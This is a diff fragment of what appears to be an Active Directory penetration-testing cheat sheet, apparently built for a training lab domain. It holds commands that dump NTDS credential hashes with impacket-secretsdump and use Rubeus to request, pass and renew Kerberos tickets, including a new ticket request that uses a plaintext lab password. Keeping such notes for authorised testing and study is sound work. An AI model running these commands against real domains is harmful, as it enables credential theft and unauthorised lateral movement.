@@ -839,7 +839,10 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
 ## Sacrificial Process 
 .\Rubeus.exe createnetonly /program:powershell.exe /show
 .\Rubeus.exe asktgs /ticket:BASE64 /service:cifs/dc01.INLANEFREIGHT.local /ptt 
-# TGT renew
+## TGT req
+.\Rubeus.exe createnetonly /program:powershell.exe /show
+.\Rubeus.exe asktgt /user:gpo_admin /password:'Password123' /domain:inlanefreight.ad /ptt
+### TGT renew
 .\Rubeus.exe renew /ticket:BASE64 /ptt /nowrap
 
 # Constrained Delegate
